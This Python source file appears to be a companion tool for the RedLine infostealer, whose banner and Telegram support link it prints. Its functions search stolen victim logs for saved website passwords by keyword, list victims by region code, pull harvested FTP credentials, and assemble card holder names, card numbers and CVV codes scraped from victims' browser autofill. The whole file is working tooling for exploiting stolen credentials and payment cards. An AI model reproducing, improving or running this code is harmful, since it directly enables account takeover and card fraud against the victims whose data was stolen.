import os


def find_site(keyword, filters):
    output = []
    path = str(os.path.dirname(os.path.abspath(__file__)))[:str(os.path.dirname(os.path.abspath(__file__))).rfind('\\')]
    with open(f"{path}/data/Passwords.txt", 'r') as f:
        data = f.readlines()
        f.close()
    for i in range(len(data)):
        if ' {[' in data[i]:
            user_hash = data[i][:data[i].find(' {[')]
        elif keyword.strip() in data[i] and 'URL: ' in data[i]:
            for filter_user in filters:
                if not filter_user.strip() in data[i + 1] or filter_user == '':
                    output.append(
                        [data[i].replace('\n', ''), data[i + 1].replace('\n', ''), data[i + 2].replace('\n', ''),
                         user_hash])
    return output


def find_ip(region, username_filters):
    output = []
    path = str(os.path.dirname(os.path.abspath(__file__)))[:str(os.path.dirname(os.path.abspath(__file__))).rfind('\\')]
    with open(f"{path}/data/ip.txt", 'r') as f:
        data = f.readlines()
        f.close()
    for i in range(len(data)):
        if ' {[' in data[i]:
            user_hash = data[i][:data[i].find(' {[')]
            if user_hash[:2].lower() == region.lower() or region == '':
                for filter in username_filters:
                    if filter in data[i + 1] or filter == '':
                        output.append(
                            [data[i + 1].replace('\n', ''), data[i + 2].replace('\n', ''),
                             data[i + 3].replace('\n', ''),
                             user_hash])
    return output


def find_log(region):
    root_path = str(os.path.dirname(os.path.abspath(__file__)))[
                :str(os.path.dirname(os.path.abspath(__file__))).rfind('\\')]
    path = f'{root_path}/logs/'
    output = {}
    for user_hash in os.listdir(path):
        if user_hash[:2].lower() == region.lower() or region == '':
            for address, dirs, files in os.walk(root_path + '\\logs\\' + user_hash):
                files_out = []
                for file in files:
                    if root_path + '\\logs\\' + user_hash == address:
                        files_out.append(file)
                        output[user_hash] = files_out
    return output


def find_ftp(region, username_filters):
    output = []
    path = str(os.path.dirname(os.path.abspath(__file__)))[:str(os.path.dirname(os.path.abspath(__file__))).rfind('\\')]
    with open(f"{path}/data/FTPs.txt", 'r') as f:
        data = f.readlines()
        f.close()
    for i in range(len(data)):
        try:
            if '{[' in data[i]:
                user_hash = data[i][:data[i].find('{[')]
            elif 'Server' in data[i]:
                output.append(
                    [data[i].replace('\n', ''), data[i + 1].replace('\n', ''), data[i + 2].replace('\n', ''),
                     user_hash])
        except:
            pass
    return output


def find_credit(region):
    image = '''***********************************************
*                                             *
*   ____  _____ ____  _     ___ _   _ _____   *
*  |  _ \| ____|  _ \| |   |_ _| \ | | ____|  *
*  | |_) |  _| | | | | |    | ||  \| |  _|    *
*  |  _ <| |___| |_| | |___ | || |\  | |___   *
*  |_| \_|_____|____/|_____|___|_| \_|_____|  *
*                                             *
*    Telegram: https://t.me/REDLINESUPPORT    *
***********************************************'''
    output = {}
    credit_data = []
    cvv = []
    root_path = str(os.path.dirname(os.path.abspath(__file__)))[
                :str(os.path.dirname(os.path.abspath(__file__))).rfind('\\')]
    path = f'{root_path}/logs/'
    for user_hash in os.listdir(path):
        try:
            if os.path.exists(f'{path}/{user_hash}/CreditCards'):
                if user_hash[:2].lower() == region.lower() or region.lower() == '':
                    if os.path.exists(f'{path}/{user_hash}/ImportantAutofills.txt'):
                        with open(f"{path}/{user_hash}/ImportantAutofills.txt", 'r') as file:
                            important_autofills = file.readlines()
                            for line in important_autofills:
                                if line.lower().find('cvv') != -1 or line.lower().find('cvc') != -1:
                                    cvv.append(line.lower().split(': ')[1])
                            file.close()
                    for autofill_name in os.listdir(f'{path}/{user_hash}/Autofills'):
                        if os.path.exists(f'{path}/{user_hash}/Autofills/{autofill_name}'):
                            with open(f'{path}/{user_hash}/Autofills/{autofill_name}', 'r') as file:
                                autofill = file.readlines()
                                for line in autofill:
                                    if line.lower().find('cvv') != -1 or line.lower().find('cvc') != -1:
                                        cvv.append(autofill[autofill.index(line) + 1].lower().split(': ')[1])
                                file.close()
                    if cvv == ['']:
                        return None
                    for card in os.listdir(f'{path}/{user_hash}/CreditCards'):
                        with open(f'{path}/{user_hash}/CreditCards/{card}', 'r') as file:
                            credit_temp = file.readlines()
                            for card_data in credit_temp:
                                if 'Holder' in card_data:
                                    if not [credit_temp[credit_temp.index(card_data)].replace('\n', '').split(': ')[1],
                                            credit_temp[credit_temp.index(card_data) + 1].replace('\n', '').split(': ')[
                                                1],
                                            credit_temp[credit_temp.index(card_data) + 2].replace('\n', '').split(': ')[
                                                1],
                                            credit_temp[credit_temp.index(card_data) + 3].replace('\n', '').split(': ')[
                                                1]] in credit_data:
                                        credit_data.append(
                                            [credit_temp[credit_temp.index(card_data)].replace('\n', '').split(': ')[1],
                                             credit_temp[credit_temp.index(card_data) + 1].replace('\n', '').split(
                                                 ': ')[1],
                                             credit_temp[credit_temp.index(card_data) + 2].replace('\n', '').split(
                                                 ': ')[1],
                                             credit_temp[credit_temp.index(card_data) + 3].replace('\n', '').split(
                                                 ': ')[1]])
                            file.close()
                    output[user_hash] = [credit_data, cvv]
        except:
            pass
    return output
